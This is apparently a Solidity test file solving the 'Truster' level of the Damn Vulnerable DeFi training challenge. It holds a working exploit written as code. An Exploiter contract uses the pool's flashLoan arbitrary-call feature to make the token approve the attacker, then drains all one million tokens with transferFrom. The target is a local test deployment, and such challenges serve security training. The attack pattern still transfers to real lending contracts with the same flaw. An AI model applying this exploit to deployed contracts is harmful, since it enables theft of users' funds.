// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(trusterLenderPool, dvt);
        exploiter.exploit();
        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
        vm.stopPrank();
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}

contract Exploiter {
    TrusterLenderPool internal immutable trusterLenderPool;
    DamnValuableToken internal immutable dvt;
    address internal immutable owner;
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
        _;
    }

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
        trusterLenderPool = _trusterLenderPool;
        dvt = _dvt;
        owner = msg.sender;
    }

    function exploit() external onlyOwner {
        trusterLenderPool.flashLoan(
            0, address(this), address(dvt), abi.encodeWithSignature("approve(address,uint256)", owner, TOKENS_IN_POOL)
        );
    }
}
